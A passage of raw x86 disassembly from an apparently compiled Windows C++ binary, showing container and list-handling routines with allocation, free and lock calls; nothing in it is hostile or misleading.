   1a576:	mov    ecx,eax
   1a578:	mov    eax,DWORD PTR [ecx+0x4]
   1a57b:	cmp    ecx,DWORD PTR [eax]
   1a57d:	je     0x1a574
   1a57f:	mov    DWORD PTR [esi],eax
   1a581:	pop    esi
   1a582:	ret    
   1a583:	int3   
   1a584:	int3   
   1a585:	int3   
   1a586:	int3   
   1a587:	int3   
   1a588:	mov    edi,edi
   1a58a:	push   ebp
   1a58b:	mov    ebp,esp
   1a58d:	mov    eax,DWORD PTR [ecx+0x4]
   1a590:	push   esi
   1a591:	mov    esi,DWORD PTR [eax+0x4]
   1a594:	push   edi
   1a595:	mov    edi,eax
   1a597:	jmp    0x1a5b2
   1a599:	push   DWORD PTR [ebp+0x8]
   1a59c:	lea    eax,[esi+0xc]
   1a59f:	push   eax
   1a5a0:	call   0x19790
   1a5a5:	test   al,al
   1a5a7:	je     0x1a5ae
   1a5a9:	mov    esi,DWORD PTR [esi+0x8]
   1a5ac:	jmp    0x1a5b2
   1a5ae:	mov    edi,esi
   1a5b0:	mov    esi,DWORD PTR [esi]
   1a5b2:	cmp    esi,DWORD PTR ds:0x7fa8c
   1a5b8:	jne    0x1a599
   1a5ba:	mov    eax,edi
   1a5bc:	pop    edi
   1a5bd:	pop    esi
   1a5be:	pop    ebp
   1a5bf:	ret    0x4
   1a5c2:	int3   
   1a5c3:	int3   
   1a5c4:	int3   
   1a5c5:	int3   
   1a5c6:	int3   
   1a5c7:	int3   
   1a5c8:	mov    edi,edi
   1a5ca:	push   ebp
   1a5cb:	mov    ebp,esp
   1a5cd:	mov    eax,DWORD PTR [ecx+0x4]
   1a5d0:	push   esi
   1a5d1:	mov    esi,DWORD PTR [eax+0x4]
   1a5d4:	push   edi
   1a5d5:	mov    edi,eax
   1a5d7:	jmp    0x1a5f2
   1a5d9:	lea    eax,[esi+0xc]
   1a5dc:	push   eax
   1a5dd:	push   DWORD PTR [ebp+0x8]
   1a5e0:	call   0x19790
   1a5e5:	test   al,al
   1a5e7:	je     0x1a5ef
   1a5e9:	mov    edi,esi
   1a5eb:	mov    esi,DWORD PTR [esi]
   1a5ed:	jmp    0x1a5f2
   1a5ef:	mov    esi,DWORD PTR [esi+0x8]
   1a5f2:	cmp    esi,DWORD PTR ds:0x7fa8c
   1a5f8:	jne    0x1a5d9
   1a5fa:	mov    eax,edi
   1a5fc:	pop    edi
   1a5fd:	pop    esi
   1a5fe:	pop    ebp
   1a5ff:	ret    0x4
   1a602:	int3   
   1a603:	int3   
   1a604:	int3   
   1a605:	int3   
   1a606:	int3   
   1a607:	int3   
   1a608:	mov    edi,edi
   1a60a:	push   ebp
   1a60b:	mov    ebp,esp
   1a60d:	mov    ecx,DWORD PTR [ebp+0x8]
   1a610:	test   ecx,ecx
   1a612:	je     0x1a61c
   1a614:	push   DWORD PTR [ebp+0xc]
   1a617:	call   0x1297a
   1a61c:	pop    ebp
   1a61d:	ret    0x8
   1a620:	int3   
   1a621:	int3   
   1a622:	int3   
   1a623:	int3   
   1a624:	int3   
   1a625:	int3   
   1a626:	mov    edi,edi
   1a628:	push   ebp
   1a629:	mov    ebp,esp
   1a62b:	mov    ecx,DWORD PTR [ebp+0x8]
   1a62e:	push   0x0
   1a630:	call   0x1a3ac
   1a635:	pop    ebp
   1a636:	ret    0x4
   1a639:	int3   
   1a63a:	int3   
   1a63b:	int3   
   1a63c:	int3   
   1a63d:	int3   
   1a63e:	mov    edi,edi
   1a640:	push   ebp
   1a641:	mov    ebp,esp
   1a643:	mov    eax,DWORD PTR [ebp+0xc]
   1a646:	mov    ecx,DWORD PTR [eax+0x34]
   1a649:	lea    eax,[ecx+eax*1+0x40]
   1a64d:	mov    ecx,DWORD PTR [ebp+0x8]
   1a650:	push   0xffffffff
   1a652:	push   eax
   1a653:	call   0x1295a
   1a658:	mov    eax,DWORD PTR [ebp+0x8]
   1a65b:	pop    ebp
   1a65c:	ret    0x8
   1a65f:	int3   
   1a660:	int3   
   1a661:	int3   
   1a662:	int3   
   1a663:	int3   
   1a664:	mov    edi,edi
   1a666:	push   ebp
   1a667:	mov    ebp,esp
   1a669:	mov    eax,DWORD PTR [ebp+0xc]
   1a66c:	mov    ecx,DWORD PTR [eax+0x38]
   1a66f:	lea    eax,[ecx+eax*1+0x40]
   1a673:	mov    ecx,DWORD PTR [ebp+0x8]
   1a676:	push   0xffffffff
   1a678:	push   eax
   1a679:	call   0x1295a
   1a67e:	mov    eax,DWORD PTR [ebp+0x8]
   1a681:	pop    ebp
   1a682:	ret    0x8
   1a685:	int3   
   1a686:	int3   
   1a687:	int3   
   1a688:	int3   
   1a689:	int3   
   1a68a:	mov    edi,edi
   1a68c:	push   ebp
   1a68d:	mov    ebp,esp
   1a68f:	mov    eax,DWORD PTR [ebp+0xc]
   1a692:	mov    ecx,DWORD PTR [eax+0x3c]
   1a695:	lea    eax,[ecx+eax*1+0x40]
   1a699:	mov    ecx,DWORD PTR [ebp+0x8]
   1a69c:	push   0xffffffff
   1a69e:	push   eax
   1a69f:	call   0x1295a
   1a6a4:	mov    eax,DWORD PTR [ebp+0x8]
   1a6a7:	pop    ebp
   1a6a8:	ret    0x8
   1a6ab:	int3   
   1a6ac:	int3   
   1a6ad:	int3   
   1a6ae:	int3   
   1a6af:	int3   
   1a6b0:	mov    edi,edi
   1a6b2:	push   ebp
   1a6b3:	mov    ebp,esp
   1a6b5:	sub    esp,0x1c
   1a6b8:	mov    eax,ds:0x7fa84
   1a6bd:	and    DWORD PTR [ebp-0x4],0x0
   1a6c1:	push   ebx
   1a6c2:	mov    ebx,DWORD PTR [ebp+0x8]
   1a6c5:	push   esi
   1a6c6:	push   edi
   1a6c7:	lea    esi,[eax+0x4]
   1a6ca:	mov    edi,ebx
   1a6cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a6cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a6ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a6cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a6d0:	lea    esi,[eax+0x14]
   1a6d3:	jmp    0x1a730
   1a6d5:	push   DWORD PTR [ebp+0xc]
   1a6d8:	mov    eax,DWORD PTR [ebx+0x8]
   1a6db:	push   DWORD PTR [eax]
   1a6dd:	or     DWORD PTR [ebp-0x4],0x1
   1a6e1:	lea    eax,[ebp-0xc]
   1a6e4:	push   eax
   1a6e5:	call   0x1a68a
   1a6ea:	push   eax
   1a6eb:	call   0x197a0
   1a6f0:	test   al,al
   1a6f2:	je     0x1a703
   1a6f4:	mov    eax,DWORD PTR [ebx+0x8]
   1a6f7:	mov    eax,DWORD PTR [eax]
   1a6f9:	cmp    BYTE PTR [eax+0x1c],0x0
   1a6fd:	mov    BYTE PTR [ebp+0xb],0x1
   1a701:	jne    0x1a707
   1a703:	mov    BYTE PTR [ebp+0xb],0x0
   1a707:	test   BYTE PTR [ebp-0x4],0x1
   1a70b:	je     0x1a71a
   1a70d:	push   DWORD PTR [ebp-0xc]
   1a710:	and    DWORD PTR [ebp-0x4],0xfffffffe
   1a714:	call   0x1d9f8
   1a719:	pop    ecx
   1a71a:	cmp    BYTE PTR [ebp+0xb],0x0
   1a71e:	jne    0x1a73f
   1a720:	mov    ecx,ebx
   1a722:	call   0x1a3d6
   1a727:	mov    esi,DWORD PTR ds:0x7fa84
   1a72d:	add    esi,0x14
   1a730:	mov    eax,DWORD PTR [ebx+0x8]
   1a733:	lea    edi,[ebp-0x1c]
   1a736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a73a:	cmp    eax,DWORD PTR [ebp-0x14]
   1a73d:	jne    0x1a6d5
   1a73f:	pop    edi
   1a740:	pop    esi
   1a741:	mov    eax,ebx
   1a743:	pop    ebx
   1a744:	leave  
   1a745:	ret    0x8
   1a748:	int3   
   1a749:	int3   
   1a74a:	int3   
   1a74b:	int3   
   1a74c:	int3   
   1a74d:	int3   
   1a74e:	mov    edi,edi
   1a750:	push   ebp
   1a751:	mov    ebp,esp
   1a753:	sub    esp,0x28
   1a756:	mov    eax,DWORD PTR [ebp+0x8]
   1a759:	push   ebx
   1a75a:	push   esi
   1a75b:	push   edi
   1a75c:	lea    esi,[eax+0x4]
   1a75f:	mov    DWORD PTR [ebp-0x8],esi
   1a762:	lea    edi,[ebp-0x18]
   1a765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a767:	and    DWORD PTR [ebp-0x4],0x0
   1a76b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a76c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a76d:	lea    ecx,[eax+0x14]
   1a770:	mov    eax,DWORD PTR [ebp-0x10]
   1a773:	mov    esi,ecx
   1a775:	lea    edi,[ebp-0x28]
   1a778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a77b:	push   0x4
   1a77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a77e:	pop    ebx
   1a77f:	mov    DWORD PTR [ebp+0x8],ecx
   1a782:	cmp    eax,DWORD PTR [ebp-0x20]
   1a785:	je     0x1a7a7
   1a787:	mov    esi,ecx
   1a789:	lea    edi,[ebp-0x28]
   1a78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a78d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a78f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a790:	mov    eax,DWORD PTR [eax]
   1a792:	add    ebx,DWORD PTR [eax]
   1a794:	inc    DWORD PTR [ebp-0x4]
   1a797:	lea    ecx,[ebp-0x18]
   1a79a:	call   0x1a3d6
   1a79f:	mov    eax,DWORD PTR [ebp-0x10]
   1a7a2:	cmp    eax,DWORD PTR [ebp-0x20]
   1a7a5:	jne    0x1a790
   1a7a7:	mov    eax,DWORD PTR [ebp+0xc]
   1a7aa:	cmp    ebx,DWORD PTR [eax+0x4]
   1a7ad:	mov    DWORD PTR [eax+0x4],ebx
   1a7b0:	jbe    0x1a7ba
   1a7b2:	mov    DWORD PTR [eax],0x1
   1a7b8:	jmp    0x1a800
   1a7ba:	and    DWORD PTR [eax],0x0
   1a7bd:	mov    esi,DWORD PTR [ebp-0x8]
   1a7c0:	lea    ebx,[eax+0x8]
   1a7c3:	mov    eax,DWORD PTR [ebp-0x4]
   1a7c6:	mov    DWORD PTR [ebx],eax
   1a7c8:	lea    edi,[ebp-0x28]
   1a7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7ce:	add    ebx,0x4
   1a7d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7d2:	jmp    0x1a7ee
   1a7d4:	mov    eax,DWORD PTR [esi]
   1a7d6:	push   DWORD PTR [eax]
   1a7d8:	push   eax
   1a7d9:	push   ebx
   1a7da:	call   0x1da7a
   1a7df:	mov    eax,DWORD PTR [esi]
   1a7e1:	add    ebx,DWORD PTR [eax]
   1a7e3:	add    esp,0xc
   1a7e6:	lea    ecx,[ebp-0x28]
   1a7e9:	call   0x1a3d6
   1a7ee:	mov    esi,DWORD PTR [ebp+0x8]
   1a7f1:	lea    edi,[ebp-0x18]
   1a7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f8:	mov    esi,DWORD PTR [ebp-0x20]
   1a7fb:	cmp    esi,DWORD PTR [ebp-0x10]
   1a7fe:	jne    0x1a7d4
   1a800:	pop    edi
   1a801:	pop    esi
   1a802:	pop    ebx
   1a803:	leave  
   1a804:	ret    0x8
   1a807:	int3   
   1a808:	int3   
   1a809:	int3   
   1a80a:	int3   
   1a80b:	int3   
   1a80c:	push   0x8
   1a80e:	push   0x7e210
   1a813:	call   0x1dab8
   1a818:	xor    esi,esi
   1a81a:	push   esi
   1a81b:	push   esi
   1a81c:	push   esi
   1a81d:	push   esi
   1a81e:	push   0x7fa5c
   1a823:	call   DWORD PTR ds:0x1ee28
   1a829:	cmp    eax,esi
   1a82b:	jl     0x1a86c
   1a82d:	mov    DWORD PTR [ebp-0x4],esi
   1a830:	push   DWORD PTR [ebp+0x8]
   1a833:	push   DWORD PTR ds:0x7fa84
   1a839:	call   0x1a74e
   1a83e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a845:	jmp    0x1a860
   1a847:	xor    eax,eax
   1a849:	inc    eax
   1a84a:	ret    
   1a84b:	mov    esp,DWORD PTR [ebp-0x18]
   1a84e:	mov    eax,DWORD PTR [ebp+0x8]
   1a851:	mov    DWORD PTR [eax],0x2
   1a857:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a85e:	xor    esi,esi
   1a860:	push   esi
   1a861:	push   0x7fa5c
   1a866:	call   DWORD PTR ds:0x1ee24
   1a86c:	call   0x1dafd
   1a871:	ret    0x4
   1a874:	int3   
   1a875:	int3   
   1a876:	int3   
   1a877:	int3   
   1a878:	int3   
   1a879:	int3   
   1a87a:	mov    edi,edi
   1a87c:	push   ebp
   1a87d:	mov    ebp,esp
   1a87f:	sub    esp,0x10
   1a882:	push   ebx
   1a883:	mov    ebx,ecx
   1a885:	mov    eax,DWORD PTR [ebx+0x10]
   1a888:	push   esi
   1a889:	lea    ecx,[eax+0x4]
   1a88c:	push   edi
   1a88d:	mov    DWORD PTR [ebx+0x10],ecx
   1a890:	push   DWORD PTR [eax]
   1a892:	call   0x1d9f8
   1a897:	xor    eax,eax
   1a899:	pop    ecx
   1a89a:	cmp    DWORD PTR [ebx+0x2c],eax
   1a89d:	jne    0x1a8ca
   1a89f:	mov    DWORD PTR [ebp-0x10],eax
   1a8a2:	mov    DWORD PTR [ebp-0xc],eax
   1a8a5:	mov    DWORD PTR [ebp-0x8],eax
   1a8a8:	mov    DWORD PTR [ebp-0x4],eax
   1a8ab:	lea    edi,[ebx+0x4]
   1a8ae:	lea    esi,[ebp-0x10]
   1a8b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8b3:	push   DWORD PTR [ebx+0x24]
   1a8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8b8:	lea    edi,[ebx+0x14]
   1a8bb:	lea    esi,[ebp-0x10]
   1a8be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8c2:	call   0x1d9f8
   1a8c7:	pop    ecx
   1a8c8:	jmp    0x1a8e1
   1a8ca:	mov    eax,DWORD PTR [ebx+0x10]
   1a8cd:	push   eax
   1a8ce:	push   DWORD PTR [eax]
   1a8d0:	lea    ecx,[ebp-0x10]
   1a8d3:	call   0x1a29e
   1a8d8:	lea    edi,[ebx+0x4]
   1a8db:	mov    esi,eax
   1a8dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a8e1:	pop    edi
   1a8e2:	pop    esi
   1a8e3:	pop    ebx
   1a8e4:	leave  
   1a8e5:	ret    
   1a8e6:	int3   
   1a8e7:	int3   
   1a8e8:	int3   
   1a8e9:	int3   
   1a8ea:	int3   
   1a8eb:	int3   
   1a8ec:	mov    edi,edi
   1a8ee:	push   ebp
   1a8ef:	mov    ebp,esp
   1a8f1:	mov    eax,DWORD PTR [ebp+0xc]
   1a8f4:	push   esi
   1a8f5:	mov    esi,ecx
   1a8f7:	mov    ecx,DWORD PTR [eax]
   1a8f9:	mov    DWORD PTR [ebp+0xc],ecx
   1a8fc:	mov    ecx,DWORD PTR [eax+0x4]
   1a8ff:	mov    edx,DWORD PTR [eax]
   1a901:	mov    DWORD PTR [ecx],edx
   1a903:	mov    ecx,DWORD PTR [eax]
   1a905:	mov    edx,DWORD PTR [eax+0x4]
   1a908:	push   eax
   1a909:	mov    DWORD PTR [ecx+0x4],edx
   1a90c:	call   0x1d9f8
   1a911:	mov    eax,DWORD PTR [ebp+0x8]
   1a914:	dec    DWORD PTR [esi+0x8]
   1a917:	pop    ecx
   1a918:	mov    ecx,DWORD PTR [ebp+0xc]
   1a91b:	mov    DWORD PTR [eax],ecx
   1a91d:	pop    esi
   1a91e:	pop    ebp
   1a91f:	ret    0x8
   1a922:	int3   
   1a923:	int3   
   1a924:	int3   
   1a925:	int3   
   1a926:	int3   
   1a927:	int3   
   1a928:	mov    edi,edi
   1a92a:	push   ebp
   1a92b:	mov    ebp,esp
   1a92d:	push   ecx
   1a92e:	push   esi
   1a92f:	mov    esi,ecx
   1a931:	jmp    0x1a946
   1a933:	mov    eax,ecx
   1a935:	mov    ecx,DWORD PTR [ecx]
   1a937:	push   eax
   1a938:	lea    eax,[ebp-0x4]
   1a93b:	mov    DWORD PTR [ebp+0xc],ecx
   1a93e:	push   eax
   1a93f:	mov    ecx,esi
   1a941:	call   0x1a8ec
   1a946:	mov    ecx,DWORD PTR [ebp+0xc]
   1a949:	cmp    ecx,DWORD PTR [ebp+0x10]
   1a94c:	jne    0x1a933
   1a94e:	mov    eax,DWORD PTR [ebp+0x8]
   1a951:	mov    DWORD PTR [eax],ecx
   1a953:	pop    esi
   1a954:	leave  
   1a955:	ret    0xc
   1a958:	int3   
   1a959:	int3   
   1a95a:	int3   
   1a95b:	int3   
   1a95c:	int3   
   1a95d:	int3   
   1a95e:	mov    edi,edi
   1a960:	push   ebp
   1a961:	mov    ebp,esp
   1a963:	push   0x0
   1a965:	push   0xc
   1a967:	call   0x11604
   1a96c:	mov    ecx,DWORD PTR [ebp+0x8]
   1a96f:	test   ecx,ecx
   1a971:	jne    0x1a975
   1a973:	mov    ecx,eax
   1a975:	mov    DWORD PTR [eax],ecx
   1a977:	mov    ecx,DWORD PTR [ebp+0xc]
   1a97a:	test   ecx,ecx
   1a97c:	jne    0x1a980
   1a97e:	mov    ecx,eax
   1a980:	mov    DWORD PTR [eax+0x4],ecx
   1a983:	pop    ebp
   1a984:	ret    0x8
   1a987:	int3   
   1a988:	int3   
   1a989:	int3   
   1a98a:	int3   
   1a98b:	int3   
   1a98c:	mov    edi,edi
   1a98e:	push   esi
   1a98f:	mov    esi,ecx
   1a991:	mov    eax,DWORD PTR [esi+0x28]
   1a994:	shl    eax,0x2
   1a997:	push   0x0
   1a999:	push   eax
   1a99a:	call   0x11604
   1a99f:	mov    DWORD PTR [esi+0x24],eax
   1a9a2:	pop    esi
   1a9a3:	ret    
   1a9a4:	int3   
   1a9a5:	int3   
   1a9a6:	int3   
   1a9a7:	int3   
   1a9a8:	int3   
   1a9a9:	int3   
   1a9aa:	mov    edi,edi
   1a9ac:	push   ebp
   1a9ad:	mov    ebp,esp
   1a9af:	push   ebx
   1a9b0:	push   esi
   1a9b1:	push   edi
   1a9b2:	mov    edi,DWORD PTR [ebp+0x8]
   1a9b5:	mov    eax,0xfffffff
   1a9ba:	mov    esi,ecx
   1a9bc:	cmp    edi,eax
   1a9be:	jbe    0x1a9c2
   1a9c0:	mov    edi,eax
   1a9c2:	mov    eax,edi
   1a9c4:	push   0x0
   1a9c6:	shl    eax,0x2
   1a9c9:	push   eax
   1a9ca:	call   0x11604
   1a9cf:	mov    ebx,eax
   1a9d1:	mov    eax,edi
   1a9d3:	shr    eax,0x2
   1a9d6:	lea    eax,[ebx+eax*4]
   1a9d9:	push   eax
   1a9da:	mov    DWORD PTR [ebp+0x8],eax
   1a9dd:	mov    eax,DWORD PTR [esi+0x20]
   1a9e0:	add    eax,0x4
   1a9e3:	push   eax
   1a9e4:	push   DWORD PTR [esi+0x10]
   1a9e7:	call   0x1a360
   1a9ec:	push   DWORD PTR [esi+0x24]
   1a9ef:	call   0x1d9f8
   1a9f4:	mov    eax,DWORD PTR [ebp+0x8]
   1a9f7:	pop    ecx
   1a9f8:	mov    DWORD PTR [esi+0x28],edi
   1a9fb:	pop    edi
   1a9fc:	mov    DWORD PTR [esi+0x24],ebx
   1a9ff:	pop    esi
   1aa00:	pop    ebx
   1aa01:	pop    ebp
   1aa02:	ret    0x4
   1aa05:	int3   
   1aa06:	int3   
   1aa07:	int3   
   1aa08:	int3   
   1aa09:	int3   
   1aa0a:	mov    edi,edi
   1aa0c:	push   ebp
   1aa0d:	mov    ebp,esp
   1aa0f:	push   edi
   1aa10:	mov    edi,DWORD PTR [ebp+0xc]
   1aa13:	cmp    DWORD PTR [ebp+0x8],edi
   1aa16:	je     0x1aa2c
   1aa18:	push   esi
   1aa19:	mov    esi,DWORD PTR [ebp+0x10]
   1aa1c:	inc    DWORD PTR [esi]
   1aa1e:	lea    ecx,[ebp+0x8]
   1aa21:	call   0x1a30e
   1aa26:	cmp    DWORD PTR [ebp+0x8],edi
   1aa29:	jne    0x1aa1c
   1aa2b:	pop    esi
   1aa2c:	pop    edi
   1aa2d:	pop    ebp
   1aa2e:	ret    
   1aa2f:	int3   
   1aa30:	int3   
   1aa31:	int3   
   1aa32:	int3   
   1aa33:	int3   
   1aa34:	mov    edi,edi
   1aa36:	push   ebp
   1aa37:	mov    ebp,esp
   1aa39:	sub    esp,0x28
   1aa3c:	push   ebx
   1aa3d:	mov    ebx,DWORD PTR [ebp+0x8]
   1aa40:	push   esi
   1aa41:	push   edi
   1aa42:	push   0xffffffff
   1aa44:	push   ebx
   1aa45:	lea    ecx,[ebp-0x8]
   1aa48:	call   0x1109a
   1aa4d:	and    DWORD PTR [ebx],0x0
   1aa50:	lea    eax,[ebp-0x8]
   1aa53:	push   eax
   1aa54:	lea    eax,[ebp-0x18]
   1aa57:	push   eax
   1aa58:	call   0x1a6b0
   1aa5d:	mov    esi,DWORD PTR ds:0x7fa84
   1aa63:	mov    eax,DWORD PTR [ebp-0x10]
   1aa66:	push   DWORD PTR [ebp-0x8]
   1aa69:	add    esi,0x14
   1aa6c:	lea    edi,[ebp-0x28]
   1aa6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aa70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aa71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aa72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aa73:	cmp    eax,DWORD PTR [ebp-0x20]
   1aa76:	je     0x1aa80
   1aa78:	mov    eax,DWORD PTR [eax]
   1aa7a:	mov    eax,DWORD PTR [eax+0x20]
   1aa7d:	inc    eax
   1aa7e:	mov    DWORD PTR [ebx],eax
   1aa80:	call   0x1d9f8
   1aa85:	pop    ecx
   1aa86:	pop    edi
   1aa87:	pop    esi
   1aa88:	pop    ebx
   1aa89:	leave  
   1aa8a:	ret    0x4
   1aa8d:	int3   
   1aa8e:	int3   
   1aa8f:	int3   
   1aa90:	int3   
   1aa91:	int3   
   1aa92:	add    DWORD PTR [ecx+0xc],0x4
   1aa96:	dec    DWORD PTR [ecx+0x2c]
   1aa99:	mov    eax,DWORD PTR [ecx+0xc]
   1aa9c:	je     0x1aaa3
   1aa9e:	cmp    eax,DWORD PTR [ecx+0x8]
   1aaa1:	jne    0x1aaa8
   1aaa3:	jmp    0x1a87a
   1aaa8:	ret    
   1aaa9:	int3   
   1aaaa:	int3   
   1aaab:	int3   
   1aaac:	int3   
   1aaad:	int3   
   1aaae:	mov    edi,edi
   1aab0:	push   esi
   1aab1:	push   0x0
   1aab3:	push   0xc
   1aab5:	mov    esi,ecx
   1aab7:	call   0x11604
   1aabc:	mov    DWORD PTR [eax],eax
   1aabe:	mov    DWORD PTR [eax+0x4],eax
   1aac1:	and    DWORD PTR [esi+0x8],0x0
   1aac5:	mov    DWORD PTR [esi+0x4],eax
   1aac8:	mov    eax,esi
   1aaca:	pop    esi
   1aacb:	ret    0x4
   1aace:	int3   
   1aacf:	int3   
   1aad0:	int3   
   1aad1:	int3   
   1aad2:	int3   
   1aad3:	int3   
   1aad4:	mov    edi,edi
   1aad6:	push   ebp
   1aad7:	mov    ebp,esp
   1aad9:	push   ecx
   1aada:	push   esi
   1aadb:	mov    esi,ecx
   1aadd:	mov    eax,DWORD PTR [esi+0x4]
   1aae0:	mov    ecx,DWORD PTR [eax]
   1aae2:	push   eax
   1aae3:	push   ecx
   1aae4:	lea    eax,[ebp-0x4]
   1aae7:	push   eax
   1aae8:	mov    ecx,esi
   1aaea:	call   0x1a928
   1aaef:	push   DWORD PTR [esi+0x4]
   1aaf2:	call   0x1d9f8
   1aaf7:	and    DWORD PTR [esi+0x4],0x0
   1aafb:	and    DWORD PTR [esi+0x8],0x0
   1aaff:	pop    ecx
   1ab00:	pop    esi
   1ab01:	leave  
   1ab02:	ret    
   1ab03:	int3   
   1ab04:	int3   
   1ab05:	int3   
   1ab06:	int3   
   1ab07:	int3   
   1ab08:	mov    edi,edi
   1ab0a:	push   ebp
   1ab0b:	mov    ebp,esp
   1ab0d:	push   ecx
   1ab0e:	mov    eax,DWORD PTR [ecx+0x4]
   1ab11:	push   DWORD PTR [eax]
   1ab13:	lea    eax,[ebp-0x4]
   1ab16:	push   eax
   1ab17:	call   0x1a8ec
   1ab1c:	leave  
   1ab1d:	ret    
   1ab1e:	int3   
   1ab1f:	int3   
   1ab20:	int3   
   1ab21:	int3   
   1ab22:	int3   
   1ab23:	int3   
   1ab24:	mov    edi,edi
   1ab26:	push   ebp
   1ab27:	mov    ebp,esp
   1ab29:	sub    esp,0x18
   1ab2c:	push   ebx
   1ab2d:	push   esi
   1ab2e:	push   edi
   1ab2f:	push   0x0
   1ab31:	push   0x400
   1ab36:	mov    ebx,ecx
   1ab38:	call   0x1a38a
   1ab3d:	cmp    DWORD PTR [ebx+0x2c],0x0
   1ab41:	mov    esi,eax
   1ab43:	mov    DWORD PTR [ebp-0x8],esi
   1ab46:	jne    0x1ab7d
   1ab48:	mov    ecx,ebx
   1ab4a:	mov    DWORD PTR [ebx+0x28],0x2
   1ab51:	call   0x1a98c
   1ab56:	mov    eax,DWORD PTR [ebx+0x24]
   1ab59:	mov    DWORD PTR [eax+0x4],esi
   1ab5c:	mov    eax,DWORD PTR [ebx+0x24]
   1ab5f:	add    eax,0x4
   1ab62:	push   eax
   1ab63:	add    esi,0x800
   1ab69:	push   esi
   1ab6a:	lea    ecx,[ebp-0x18]
   1ab6d:	call   0x1a29e
   1ab72:	lea    edi,[ebx+0x4]
   1ab75:	mov    esi,eax
   1ab77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ab7b:	jmp    0x1abdb
   1ab7d:	mov    ecx,DWORD PTR [ebx+0x28]
   1ab80:	mov    edx,DWORD PTR [ebx+0x24]
   1ab83:	mov    eax,DWORD PTR [ebx+0x20]
   1ab86:	lea    ecx,[edx+ecx*4-0x4]
   1ab8a:	cmp    eax,ecx
   1ab8c:	jae    0x1ab9c
   1ab8e:	add    eax,0x4
   1ab91:	mov    DWORD PTR [ebx+0x20],eax
   1ab94:	mov    DWORD PTR [eax],esi
   1ab96:	push   DWORD PTR [ebx+0x20]
   1ab99:	push   esi
   1ab9a:	jmp    0x1abd3
   1ab9c:	sub    eax,DWORD PTR [ebx+0x10]
   1ab9f:	mov    ecx,ebx
   1aba1:	sar    eax,0x2
   1aba4:	inc    eax
   1aba5:	mov    edi,eax
   1aba7:	lea    eax,[edi+edi*1]
   1abaa:	push   eax
   1abab:	call   0x1a9aa
   1abb0:	lea    ecx,[eax+edi*4]
   1abb3:	mov    DWORD PTR [ecx],esi
   1abb5:	push   eax
   1abb6:	push   DWORD PTR [ebx+0xc]
   1abb9:	mov    DWORD PTR [ebp-0x4],ecx
   1abbc:	lea    ecx,[ebp-0x18]
   1abbf:	call   0x1a29e
   1abc4:	push   DWORD PTR [ebp-0x4]
   1abc7:	lea    edi,[ebx+0x4]
   1abca:	push   DWORD PTR [ebp-0x8]
   1abcd:	mov    esi,eax
   1abcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abd3:	lea    ecx,[ebp-0x18]
   1abd6:	call   0x1a29e
   1abdb:	lea    edi,[ebx+0x14]
   1abde:	mov    esi,eax
